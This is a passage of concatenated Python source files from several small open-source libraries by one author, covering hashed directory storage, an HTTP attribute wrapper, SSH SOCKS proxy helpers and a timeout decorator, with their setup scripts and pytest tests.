            copy_to_file(from_file=file_obj, to_path=final_path)
        except Exception:
            os.unlink(final_path)
            raise

        return PathAndHash(path=final_path, hash=file_hash)

    def delete_by_file(self, file_obj):
        """
        Remove file from the storage. File is identified by opened `file_obj`,
        from which the hashes / path are computed.

        Args:
            file_obj (file): Opened file-like object, which is used to compute
                     hashes.

        Raises:
            IOError: If the `file_obj` is not in storage.
        """
        BalancedDiscStorage._check_interface(file_obj)

        file_hash = self._get_hash(file_obj)

        return self.delete_by_hash(file_hash)

    def delete_by_hash(self, file_hash):
        """
        Remove file/archive by it's `file_hash`.

        Args:
            file_hash (str): Hash, which is used to find the file in storage.

        Raises:
            IOError: If the file for given `file_hash` was not found in \
                     storage.
        """
        full_path = self.file_path_from_hash(file_hash)

        return self.delete_by_path(full_path)

    def _recursive_remove_blank_dirs(self, path):
        """
        Make sure, that blank directories are removed from the storage.

        Args:
            path (str): Path which you suspect that is blank.
        """
        path = os.path.abspath(path)

        # never delete root of the storage or smaller paths
        if path == self.path or len(path) <= len(self.path):
            return

        # if the path doesn't exists, go one level upper
        if not os.path.exists(path):
            return self._recursive_remove_blank_dirs(
                os.path.dirname(path)
            )

        # if the directory contains files, end yourself
        if os.listdir(path):
            return

        # blank directories can be removed
        shutil.rmtree(path)

        # go one level up, check whether the directory is blank too
        return self._recursive_remove_blank_dirs(
            os.path.dirname(path)
        )

    def delete_by_path(self, path):
        """
        Delete file/directory identified by `path` argument.

        Warning:
            `path` have to be in :attr:`path`.

        Args:
            path (str): Path of the file / directory you want to remove.

        Raises:
            IOError: If the file / directory doesn't exists, or is not in \
                     :attr:`path`.
        """
        if not os.path.exists(path):
            raise IOError("Unknown path '%s'!" % path)

        if not path.startswith(self.path):
            raise IOError(
                "Path '%s' is not in the root of the storage ('%s')!" % (
                    path,
                    self.path
                )
            )

        if os.path.isfile(path):
            os.unlink(path)
            return self._recursive_remove_blank_dirs(path)

        shutil.rmtree(path)
        self._recursive_remove_blank_dirs(path)

    def __repr__(self):
        return "%s(path=%s, dir_limit=%d)" % (
            self.__class__.__name__,
            repr(self.path),
            self.dir_limit
        )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7, 3.4
#


def allSame(s):
    return not any([x for x in s if x != s[0]])


def hasDigit(s):
    return any(char.isdigit() for char in s)


def getVersion(data):
    """
    Parse version from changelog written in RST format.
    """
    data = data.splitlines()
    return next((
        v for v, u in zip(data, data[1:])  # v = version, u = underline
        if len(v) == len(u) and allSame(u) and hasDigit(v) and "." in v
    ))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
import os
import sys
import urllib.request, urllib.error, urllib.parse
import os.path

sys.path.insert(0, os.path.abspath('../src/'))

extensions = [
    'sphinx.ext.autodoc',
    'sphinxcontrib.napoleon',
    'sphinx.ext.intersphinx'
]

intersphinx_mapping = {
    'python': ('http://docs.python.org/2.7', None),
    'amqp': ("http://edeposit-amqp.readthedocs.org/en/latest/", None),
}

# Napoleon settings
napoleon_google_docstring = True
napoleon_numpy_docstring = False
napoleon_include_private_with_doc = False
napoleon_include_special_with_doc = True

# Sorting of items
autodoc_member_order = "bysource"

# Document all methods in classes
autoclass_content = 'both'

# Add any paths that contain templates here, relative to this directory.
templates_path = ['_templates']

# The suffix of source filenames.
source_suffix = '.rst'

# The master toctree document.
master_doc = 'index'

# General information about the project.
project = 'BalancedDiscStorage'
copyright = '2015 Bystroushaak for E-deposit team'

# The full version, including alpha/beta/rc tags.
try:
    # read data from CHANGELOG.rst
    sys.path.insert(0, os.path.abspath('../'))
    from docs import getVersion
    release = getVersion(open("../CHANGELOG.rst").read())
except Exception:
    # this is here specially for readthedocs, which downloads only docs, not
    # other files
    fh = urllib.request.urlopen("https://pypi.python.org/pypi/" + project + "/")
    release = [x for x in fh.read().splitlines() if "<title>" in x]
    release = release[0].split(":")[0].split()[1]

# The short X.Y version.
version = ".".join(release.split(".")[:2])

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
exclude_patterns = ['_build']

# The name of the Pygments (syntax highlighting) style to use.
pygments_style = 'sphinx'

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
html_theme = 'default'

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named "default.css" will overwrite the builtin "default.css".
html_static_path = ['_static']

# If true, links to the reST sources are added to the pages.
html_show_sourcelink = True

# Output file base name for HTML help builder.
htmlhelp_basename = 'BalancedDiscStorage'
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages

from docs import getVersion


# Variables ===================================================================
CHANGELOG = open('CHANGELOG.rst').read()
LONG_DESCRIPTION = "\n\n".join([
    open('README.rst').read(),
    open('CONTRIBUTORS.rst').read(),
    CHANGELOG
])


# Actual setup definition =====================================================
setup(
    name='BalancedDiscStorage',
    version=getVersion(CHANGELOG),
    description=(
        "Makes sure, that there are never more files in one directory, than "
        "your LIMIT."
    ),
    long_description=LONG_DESCRIPTION,
    url='https://github.com/Bystroushaak/BalancedDiscStorage',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Development Status :: 3 - Alpha",

        "Programming Language :: Python",
        "Programming Language :: Python :: 2.7",
        "Programming Language :: Python :: 3",

        "Intended Audience :: Developers",
        "Topic :: Software Development :: Libraries",
        "Topic :: Software Development :: Libraries :: Python Modules",

        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},

    include_package_data=True,
    zip_safe=False,

    extras_require={
        "test": [
            "pytest",
            "pytest-cov",
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    }
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from BalancedDiscStorage.path_and_hash import PathAndHash


# Tests =======================================================================
def test_path_and_hash():
    assert PathAndHash("hello") == "hello"
    assert PathAndHash("hello").hash == None


def test_hash_constructor():
    ph = PathAndHash("/somepath", "hfffhsomehash")

    assert ph.path == "/somepath"
    assert ph.hash == "hfffhsomehash"

    assert str(ph) == "/somepath"
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import argparse

import sh


# Functions & classes =========================================================
def _forever_gen():
    cnt = 0
    while True:
        yield cnt
        cnt += 1


def look_for_hash(filename, startswith, number):
    found = 0
    for cnt in _forever_gen():
        with open(filename, "w") as f:
            f.write(str(cnt))

        file_hash = sh.sha256sum(args.filename).split()[0]

        if file_hash.startswith(startswith):
            found += 1
            print(file_hash, cnt)

            if found == number:
                break

    if number != 1:
        sh.rm(filename)


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="""Write into file until you found the file with hash wich s\
    tarts with given character."""
    )
    parser.add_argument(
        "-s",
        "--startswith",
        required=True,
        help="String with which the hash should start."
    )
    parser.add_argument(
        "-f",
        "--filename",
        default="file.txt",
        help="Name of the file which will be checked. Default `file.txt`."
    )
    parser.add_argument(
        "-n",
        "--number",
        default=1,
        type=int,
        help="Number of hashes which should be found. Default 1."
    )
    args = parser.parse_args()

    look_for_hash(
        filename=args.filename,
        startswith=args.startswith,
        number=args.number,
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import shutil
import os.path
import tempfile

from os.path import join

import pytest

from BalancedDiscStorage import BalancedDiscStorage


# Variables ===================================================================
TEMP_DIR = None


# Functions ===================================================================
def data_dir_context(filename):
    return join(
        os.path.dirname(__file__),
        "files",
        filename
    )


def data_file_context(filename):
    return open(data_dir_context(filename), "rb")


# Fixtures ====================================================================
@pytest.fixture
def bds():
    return BalancedDiscStorage(TEMP_DIR)


@pytest.fixture
def a_file():
    return data_file_context("a_file")


@pytest.fixture
def b_file():
    return data_file_context("b_file")


@pytest.fixture
def aa_file():
    return data_file_context("aa_file")


@pytest.fixture
def a_file_hash():
    return "aea92132c4cbeb263e6ac2bf6c183b5d81737f179f21efdc5863739672f0f470_2"


@pytest.fixture
def b_file_hash():
    return "b17ef6d19c7a5b1ee83b907c595526dcb1eb06db8227d650d5dda0a9f4ce8cd9_2"


@pytest.fixture
def aa_file_hash():
    return "aae02129362d611717b6c00ad8d73bf820a0f6d88fca8e515cafe78d3a335965_3"


@pytest.fixture
def b_file_path():
    return join(TEMP_DIR, "b", b_file_hash())


@pytest.fixture
def aa_file_path():
    file_hash = aa_file_hash()

    return join(TEMP_DIR, file_hash[0], file_hash[1], aa_file_hash())


# Setup =======================================================================
def setup_module():
    global TEMP_DIR

    TEMP_DIR = tempfile.mkdtemp()


def teardown_module():
    shutil.rmtree(TEMP_DIR)


# Tests =======================================================================
def test_init():
    bds = BalancedDiscStorage(TEMP_DIR)

    with pytest.raises(TypeError):
        BalancedDiscStorage()


def test_init_exists():
    with pytest.raises(IOError):
        BalancedDiscStorage("/azgabash")


def test_init_is_directory():
    fn_path = join(TEMP_DIR, "azgabash")
    with open(fn_path, "w") as f:
        f.write("-")

    with pytest.raises(IOError):
        BalancedDiscStorage(fn_path)

    os.unlink(fn_path)


def test_rw_check():
    non_writeable = join(TEMP_DIR, "non_writeable")
    os.mkdir(non_writeable)
    os.chmod(non_writeable, 0o000)

    with pytest.raises(IOError):
        BalancedDiscStorage(non_writeable)

    os.chmod(non_writeable, 0o777)
    shutil.rmtree(non_writeable)


def test_add_file(bds, a_file, a_file_hash):
    bds.add_file(a_file)

    first_branch = join(TEMP_DIR, "a")
    first_added_file = join(first_branch, a_file_hash)

    assert os.path.exists(first_branch)
    assert os.path.isdir(first_branch)
    assert os.path.exists(first_added_file)
    assert os.path.isfile(first_added_file)


def test_add_multiple_files(bds, b_file, aa_file, aa_file_hash, b_file_path):
    bds.dir_limit = 1

    bds.add_file(b_file)
    bds.add_file(aa_file)

    first_branch = join(TEMP_DIR, "a")
    deep_branch = join(first_branch, "a")
    third_added_file = join(deep_branch, aa_file_hash)

    assert os.path.exists(first_branch)
    assert os.path.isdir(first_branch)
    assert os.path.exists(deep_branch)
    assert os.path.isdir(deep_branch)

    assert os.path.exists(b_file_path)
    assert os.path.isfile(b_file_path)

    assert os.path.exists(third_added_file)
    assert os.path.isfile(third_added_file)


def test_adding_existing_file(bds, b_file, b_file_path):
    assert os.path.exists(b_file_path)
    assert os.path.isfile(b_file_path)

    path = bds.add_file(b_file)

    assert os.path.exists(path)
    assert os.path.isfile(path)


def test_adding_object_with_wrong_interface(bds):
    with pytest.raises(AssertionError):
        bds.add_file("hello")


def test_file_path_from_hash(bds, b_file_hash, b_file_path):
    assert bds.file_path_from_hash(b_file_hash) == b_file_path


def test_file_path_from_bad_hash(bds):
    with pytest.raises(IOError):
        bds.file_path_from_hash("azgabash")


def test_file_path_from_hash_subdirectory(bds, aa_file_hash, aa_file_path):
    assert bds.file_path_from_hash(aa_file_hash) == aa_file_path


def test_delete_by_file(bds, b_file, b_file_path):
    assert os.path.exists(b_file_path)
    assert os.path.isfile(b_file_path)

    bds.delete_by_file(b_file)

    assert not os.path.exists(b_file_path)
    assert not os.path.isfile(b_file_path)


def test_delete_unknown_path(bds):
    with pytest.raises(IOError):
        bds.delete_by_path("/azgabash")


def test_delete_unknown_existing_path(bds):
    with pytest.raises(IOError):
        bds.delete_by_path("/tmp")
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import shutil
import os.path
import tempfile

from os.path import join

import pytest

from BalancedDiscStorage import BalancedDiscStorageZ

from test_balanced_disc_storage import data_file_context


# Variables ===================================================================
TEMP_DIR = None


# Fixtures ====================================================================
@pytest.fixture
def bdsz():
    return BalancedDiscStorageZ(TEMP_DIR)


@pytest.fixture
def archive_file():
    return data_file_context("archive.zip")


@pytest.fixture
def archive_file_hash():
    return "b5770bf1233f932fb5d5729a07fc786e3040bcdbe528b70a4ad2cbc3b6eb2380_12d"


@pytest.fixture
def archive_file_path():
    file_hash = archive_file_hash()

    return join(TEMP_DIR, file_hash[0], file_hash) + "/"


@pytest.fixture
def archive_filenames():
    return [
        join(archive_file_path(), fn)
        for fn in ["metadata.xml", "some.pdf"]
    ]


# Setup =======================================================================
def setup_module():
    global TEMP_DIR

    TEMP_DIR = tempfile.mkdtemp()


def teardown_module():
    shutil.rmtree(TEMP_DIR)


# Tests =======================================================================
def test_init():
    bdsz = BalancedDiscStorageZ(TEMP_DIR)

    with pytest.raises(TypeError):
        BalancedDiscStorageZ()


def test_add_archive_as_dir(bdsz, archive_file, archive_file_hash,
                            archive_file_path, archive_filenames):
    bdsz.dir_limit = 20
    assert not os.path.exists(archive_file_path)

    bdsz.add_archive_as_dir(archive_file)

    assert os.path.exists(archive_file_path)
    assert os.path.isdir(archive_file_path)

    for filename in archive_filenames:
        assert os.path.exists(filename)
        assert os.path.isfile(filename)


def test_add_archie_twice(bdsz, archive_file, archive_file_hash,
                          archive_file_path, archive_filenames):
    bdsz.add_archive_as_dir(archive_file)
    bdsz.add_archive_as_dir(archive_file)

    assert os.path.exists(archive_file_path)
    assert os.path.isdir(archive_file_path)

    for filename in archive_filenames:
        assert os.path.exists(filename)
        assert os.path.isfile(filename)


def test_path_from_hash_for_zip(bdsz, archive_file_path, archive_file_hash):
    assert bdsz.file_path_from_hash(archive_file_hash) == archive_file_path


def test_delete_by_file_zip(bdsz, archive_file, archive_file_path):
    assert os.path.exists(archive_file_path)
    assert os.path.isdir(archive_file_path)

    bdsz.delete_by_file(archive_file)

    assert not os.path.exists(archive_file_path)
    assert not os.path.isdir(archive_file_path)

    # check that blank directories are also cleaned
    assert not os.path.exists(join(TEMP_DIR, "b"))


def test_too_many_zip_files(bdsz, archive_file):
    bdsz.max_zipfiles = 1

    with pytest.raises(ValueError):
        bdsz.add_archive_as_dir(archive_file)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from attribute_wrapper import *#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import json
import requests
from os.path import join


# Classes =====================================================================
class GenericWrapper(object):
    """
    Generic attribute-access object, which create URL paths from attribute
    calls.

    Each attribute access (``.path`` for example) is mapped to URL path
    (``URL/path`` for example).

    Each call of the attribute (``obj.path.get()``) is then translated to
    :method:`.download_handler` call as ``.download_handler("get", "URL/path",\
    **kwargs)``.

    You can subclass this class and redefine :method:`.download_handler` to
    server your own needs - see :class:`JSONWrapper` and :class:`HTTPWrapper`.

    Attributes:
        url (str): Part of the URL in linked list chain. See
                   :method:`.get_url` for details.
        parent (obj): Reference to parent in linked list chain.
        suffix (str): Optional suffix, which will be added to URL.
    """
    def __init__(self, url, parent=None, suffix=None):
        """
        Args:
            url (self): Base URL of the HTTP resource you want to access.
        """
        self.url = url
        self.parent = parent
        self.suffix = suffix

        # get specials from parent if defined
        self.specials = self._get_root().specials if self.parent else {
            "__dot__": ".",
            "__slash__": "/",
            "__dash__": "-",
        }

    def download_handler(self, method, url, data):
        """
        Here should be your definition of this method, which is expected to
        take some data and return result.

        Args:
            method (str): Last part of the attribute path before call -
                   ``obj.something.get()`` will render `get` as `method`.
            url (str): Hopefully valid URL composed from attribute paths.
            data (dict): Parameters given to attribute call.
        """
        raise NotImplementedError(
            "You should implement `.download_handler()` in your code!"
        )

    def __call__(self, **kwargs):
        """
        Handle calls to attribute.
        """
        url = self.get_url(True)
        url = self._replace_specials(url)

        # call to the root of the object
        if not self.parent:
            raise ValueError("Method not given.")

        # add suffix to non-domain urls
        if self.parent.parent and self.suffix:
            url += self.suffix

        # params = args if args else kwargs
        return self.download_handler(
            method=self.url,  # this is the last part of the attribute access
            url=url,
            data=kwargs if kwargs else None,
        )

    def _(self, path):
        """
        Special underscore method for complicated paths.
        """
        return self.__class__(path, self, self.suffix)

    def _replace_specials(self, url):
        """
        In `url` replace keys from :attr:`specials` with correspondings vals.

        Args:
            url (str): String where the values are replaced.

        Returns:
            str: Updated string.
        """
        for key, val in self.specials.iteritems():
            url = url.replace(key, val)

        return url

    def _get_root(self):
        """
        Get root object from the hierarchy.

        Returns:
            obj: :class:`Recurser` instance of the root object.
        """
        if self.parent:
            return self.parent._get_root()

        return self

    def get_url(self, called=False):
        """
        Compose url from self and all previous items in linked list.

        Args:
            called (bool, default False): Switch to let the function knows,
                   that it should ignore the last part of the URL, which is
                   method type.

        Returns:
            str: Composed URL.
        """
        if not self.parent:
            return self.url

        # last call (called=True) is used for determining http method
        if called:
            return self.parent.get_url()
        else:
            return join(self.parent.get_url(), self.url)

    def __getattr__(self, attr):
        """
        Take care of URL composition.
        """
        if attr == "_":
            return self.__class__(attr, self, self.suffix)

        return self.__dict__.get(
            attr,
            self.__class__(attr, self, self.suffix)
        )


class JSONWrapper(GenericWrapper):
    """
    Special example of :class:`GenericWrapper`, which translates all calls
    and given data to JSON and send it **as body** to given URL.

    Functions also adds ``content-type: application/json`` header to each
    request.
    """
    def download_handler(self, method, url, data):
        if data:
            data = json.dumps(data)

        headers = {
            'content-type': 'application/json'
        }

        resp = requests.request(method, url, headers=headers, data=data)

        # handle http errors
        resp.raise_for_status()

        return json.loads(resp.text)


class HTTPWrapper(GenericWrapper):
    """
    Example of :class:`GenericWrapper`, which translates all calls and given
    data to HTTP form parameters.
    """
    def download_handler(self, method, url, data):
        resp = requests.request(method, url, params=data)

        # handle http errors
        resp.raise_for_status()

        return resp.text
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages


# Variables ===================================================================
changelog = open('CHANGES.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions & classes =========================================================
def allSame(s):
    return not filter(lambda x: x != s[0], s)


def hasDigit(s):
    return any(map(lambda x: x.isdigit(), s))


def getVersion(data):
    data = data.splitlines()
    return filter(
        lambda (x, y):
            len(x) == len(y) and allSame(y) and hasDigit(x) and "." in x,
        zip(data, data[1:])
    )[0][0]


setup(
    name='attribute_wrapper',
    version=getVersion(changelog),
    description="Class wrapper, which maps attribute calls to HTTP API.",
    long_description=long_description,
    url='https://github.com/Bystroushaak/attribute_wrapper',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Topic :: Utilities",
        "Topic :: Internet :: WWW/HTTP",
        "Programming Language :: Python :: 2.7",
        "License :: OSI Approved :: MIT License",
        "Topic :: Software Development :: Libraries",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},

    include_package_data=True,
    zip_safe=True,
    install_requires=[
        "setuptools",
        "requests",
    ],
    extras_require={
        "test": [
            "pytest",
        ]
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys

import pytest

sys.path.insert(0, "src")
sys.path.insert(0, "../src")

from attribute_wrapper import GenericWrapper


# Classes =====================================================================
class ReturnWrapper(GenericWrapper):
    def download_handler(self, method, url, data):
        return (method, url, data)


# Fixtures ====================================================================
@pytest.fixture
def p():
    return ReturnWrapper("http://kitakitsune.org")


@pytest.fixture
def r():
    return ReturnWrapper("return")


# Tests =======================================================================
def test_wrapper():
    p = ReturnWrapper("return")

    assert p.attribute.get() == ("get", "return/attribute", None)


def test_http_url(p):
    assert p.get() == ("get", "http://kitakitsune.org", None)
    assert p.attr.get() == ("get", "http://kitakitsune.org/attr", None)


def test_other_methods(p):
    assert p.post() == ("post", "http://kitakitsune.org", None)
    assert p.update() == ("update", "http://kitakitsune.org", None)

    assert p.attr.post() == ("post", "http://kitakitsune.org/attr", None)
    assert p.attr.update() == ("update", "http://kitakitsune.org/attr", None)


def test_no_method_given(p):
    with pytest.raises(ValueError):
        assert p()


def test_multiple_attributes(p):
    assert p.m() == ("m", "http://kitakitsune.org", None)
    assert p.b.m() == ("m", "http://kitakitsune.org/b", None)
    assert p.c.b.m() == ("m", "http://kitakitsune.org/c/b", None)
    assert p.d.c.b.m() == ("m", "http://kitakitsune.org/d/c/b", None)


def test_data(r):
    assert r.m(key="val") == ("m", "return", {"key": "val"})
    assert r.m(k="v", x=1) == ("m", "return", {"k": "v", "x": 1})
    assert r.b.m(k="v", x=1) == ("m", "return/b", {"k": "v", "x": 1})


def test_special_characters(r):
    assert r.azgabash__dot__txt.m() == ("m", "return/azgabash.txt", None)
    assert r.azgabash__slash__txt.m() == ("m", "return/azgabash/txt", None)
    assert r.azgabash__dash__txt.m() == ("m", "return/azgabash-txt", None)

    # test multiple special characters in one attribute
    assert r.aa__dash__aa__dot__txt.m() == ("m", "return/aa-aa.txt", None)

    # test with multiple attributes
    assert r.__dot__.__dash__.__slash__.m() == ("m", "return/./-//", None)


def test_automatic_suffix(p):
    p.suffix = ".txt"

    assert p.m() == ("m", "http://kitakitsune.org", None)  # no suffix
    assert p.file.m() == ("m", "http://kitakitsune.org/file.txt", None)

    # test also constructor
    p = ReturnWrapper("http://kitakitsune.org", suffix=".txt")

    assert p.m() == ("m", "http://kitakitsune.org", None)  # no suffix
    assert p.file.m() == ("m", "http://kitakitsune.org/file.txt", None)
    assert p.raw.file.m() == ("m", "http://kitakitsune.org/raw/file.txt", None)


def test_underscore_method(r):
    assert r._("a/~anyt$ů§hing").m() == ("m", "return/a/~anyt$ů§hing", None)
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from IPtools import *#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module to ease usage of SOCK5 proxy and SSH tunnel installation.

There is also functions for checking your IP.

Examples:
--
>>> import IPtools
>>> IPtools.getIP()
'429.292.637.2'  # modified to protect my privacy
--

SSH proxy:
--
>>> port = IPtools.sshTunnel("bystrousak@kitakitsune.org", "###")
>>> IPtools.installProxy("localhost", port)
>>> IPtools.getIP()
'31.31.73.113'
--

Restoring original socket:
--
>>> import IPtools
>>> IPtools.getIP()
'429.292.637.2'
>>> IPtools.installProxy("localhost", IPtools.sshTunnel("bystrousak@kitakitsune.org", "###"))
>>> IPtools.getIP()
'31.31.73.113'
>>> IPtools.restoreSocket()
>>> IPtools.getIP()
'429.292.637.2'
>>>
--

Author: Bystroushaak (bystrousak@kitakitsune.org)
"""
#
# Imports #####################################################################
import sys
import copy
import socket
import random
import urllib2


try:
    import pexpect
except ImportError, e:
    sys.stderr.write(
        "I do require pexpect module. You can get it from\n"
        "http://sourceforge.net/projects/pexpect/ OR from 'python-pexpect'"
        "ubuntu package OR from PIP (pexpect)\n"
    )
    raise


try:
    import socks
except ImportError, e:
    sys.stderr.write(
        "I do require sock module. You can get it from\n"
        "http://socksipy.sourceforge.net/ OR from PIP (SocksiPy)\n"
    )
    raise


try:
    from timeout_wrapper import timeout
except ImportError, e:
    sys.stderr.write(
        "I do require sock module. You can get it from\n"
        "using sudo pip install -U timeout_wrapper.\n"
    )
    raise


# Vars ########################################################################
_IP = ["", ""]
TIMEOUT = 10.0
ORIG_SOCK = None

EXPECT_CLASS = []  # this is necessary due to garbage collector


# Functions & objects #########################################################
class ProxyException(Exception):
    pass


@timeout(
    int(TIMEOUT / 2),
    exception_message="The proxy is slower than your %ss .TIMEOUT!" % TIMEOUT
)
def _get_page(url):
    f = urllib2.urlopen(url)
    data = f.read()
    f.close()

    return data


def getIP():
    """
    Get current IP address.

    Returns:
        str: IP address.
    """
    data = _get_page("http://myip.cz")
    data = data.split("Your IP Address is: <b>")[-1].split("</b>")[0]
    return data.strip()


@timeout(int(TIMEOUT), None)
def installProxy(SOCK_ADDR, SOCK_PORT, check_ip=True):
    """
    Install SOCKS5 proxy.

    Raise ProxyTimeoutException
    """
    # get normal ip
    if check_ip:
        try:
            _IP[0] = getIP()
        except Exception, e:
            raise ProxyException("Can't connect to internet!\n" + str(e))

    # save original socket
    global ORIG_SOCK
    ORIG_SOCK = copy.copy(socket.socket)

    # apply proxy
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, SOCK_ADDR, SOCK_PORT)
    socket.socket = socks.socksocket

    # get ip over proxy
    if not check_ip:
        return

    try:
        _IP[1] = getIP()
    except Exception, e:
        raise ProxyException(
            "Your SOCK5 proxy (" + SOCK_ADDR + ":" + str(SOCK_PORT) + ") "
            "isn't responding!\n" +
            str(e)
        )

    if _IP[0] == _IP[1]:
        raise ProxyException(
            "This proxy doesn't hides your IP, use better one."
        )


def sshTunnel(login_serv, e, port=None, timeout=TIMEOUT):
    """
    Create (but don't use -> see installProxy()) SOCKS5 tunnel over SSH.

    Example:
    ---
    import IPtools

    print IPtools.getIP() # -> your IP

    IPtools.installProxy(
        "localhost",
        IPtools.sshTunnel("ssh@somewhere.com", timeout = 30)
    )

    print IPtools.getIP() # -> tunnel's IP
    ---

    Return port where the tunnel is listenning.
    """
    if port is None:
        port = random.randint(1025, 65534)

    # create ssh tunnel
    c = pexpect.spawn("ssh -D " + str(port) + " " + login_serv)
    tmp = c.expect([e, "yes/no"], timeout=timeout)

    # ssh key authorization
    if tmp == 1:
        c.sendline("yes")
        c.expect(e, timeout=timeout)

    EXPECT_CLASS.append(c)  # dont let garbage collector delete this
    return port


def restoreSocket():
    """Removes proxy from your system and restores original socket."""
    global ORIG_SOCK
    socket.socket = ORIG_SOCK
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import signal


# Functions & classes =========================================================
class TimeoutException(Exception):
    """
    Exception triggered when the decorated function timeouts.
    """
    def __init__(self, message = ""):
        self.message = message

    def __str__(self):
        return repr(self.message)


def __timeout_handler(signum, frame):
    raise TimeoutException()


def timeout(time_s, default_val=None, exception_message="Timeouted!"):
    """
    Timeout wrapper.

    Args:
        time_s (int): Time measured in seconds.
        default_val (any): If set, return value of this parameter instead of
                           raising :class:`TimeoutException`.
        exception_message (str, default "Timeouted!"): If set, raise 
                          :class:`TimeoutException` with given
                          `exception_message`.
    """
    def __timeout_function(f):
        def decorator(*args, **kwargs):
            old_handler = signal.signal(
                signal.SIGALRM, __timeout_handler)
            signal.alarm(time_s)  # triger alarm in time_s seconds

            try:
                retval = f(*args, **kwargs)
            except TimeoutException:
                if default_val is None:
                    raise TimeoutException(exception_message)
                return default_val
            finally:
                signal.signal(signal.SIGALRM, old_handler)

            signal.alarm(0)
            return retval

        return decorator

    return __timeout_function
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from timeout import *
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages


# Variables ===================================================================
changelog = open('CHANGES.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Functions ===================================================================
def allSame(s):
    return not filter(lambda x: x != s[0], s)


def hasDigit(s):
    return any(map(lambda x: x.isdigit(), s))


def getVersion(data):
    data = data.splitlines()
    return filter(
        lambda (x, y):
            len(x) == len(y) and allSame(y) and hasDigit(x) and "." in x,
        zip(data, data[1:])
    )[0][0]


# Actual setup definition =====================================================
setup(
    name='timeout_wrapper',
    version=getVersion(changelog),
    description='Timeout decorator with defaults and exceptions.',
    long_description=long_description,
    url='https://github.com/Bystroushaak/timeout_wrapper',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        'Intended Audience :: Developers',
        "Programming Language :: Python :: 2",
        'Programming Language :: Python :: 2.7',
        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},
    include_package_data=True,
    zip_safe=True,

    test_suite='py.test',
    tests_require=["pytest"],
    extras_require={
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    },
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import time

import pytest

sys.path.append('src/')
from timeout_wrapper import timeout, TimeoutException


# Variables ===================================================================
SLEEP_TIME = 5
WAIT_TIME = 1
MESSAGE = "Timeouted!"


# Functions & classes =========================================================
def test_wrapper():
    @timeout(WAIT_TIME, 1111)
    def sleep():
        time.sleep(SLEEP_TIME)

    ts = time.time()
    assert sleep() == 1111
    te = time.time()

    assert int(te - ts) == WAIT_TIME, "Timeout takes too long!"


def test_default_value():
    @timeout(WAIT_TIME, "timeouted")
    def sleep2():
        time.sleep(SLEEP_TIME)

    assert sleep2() == "timeouted"


def test_exception():
    @timeout(WAIT_TIME)
    def sleep3():
        time.sleep(SLEEP_TIME)

    with pytest.raises(TimeoutException) as excinfo:
        sleep3()


def test_exception_message():
    @timeout(WAIT_TIME, exception_message=MESSAGE)
    def sleep3():
        time.sleep(SLEEP_TIME)

    with pytest.raises(TimeoutException) as excinfo:
        sleep3()
        assert excinfo.message == MESSAGE
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from ZODB import DB
from ZEO import ClientStorage

from zeo_wrapper_prototype import ZEOWrapperPrototype


# Functions & classes =========================================================
class ZEOWrapper(ZEOWrapperPrototype):
    """
    ZEO wrapper based on ZEO client XML configuration file.

    Attributes:
        conf_path (str): Path to the configuration file.
        project_key (str): Project key, under which will this object access the
            ZEO structure.
        default_type (obj): Default data object used for root, if the root
            wasn't already created in ZEO.
    """
    def __init__(self, server, port, project_key=None,
                 run_asyncore_thread=True):
        """
        Initialize the object.

        Args:
            conf_path (str): See :attr:`conf_path`.
            project_key (str, default None): See :attr:`project_key`. If not
                set, the root of the database is used (this may cause
                performace issues).
            run_asyncore_thread (bool, default True): Run external asyncore
                thread, which handles connections to database? Default True.
        """
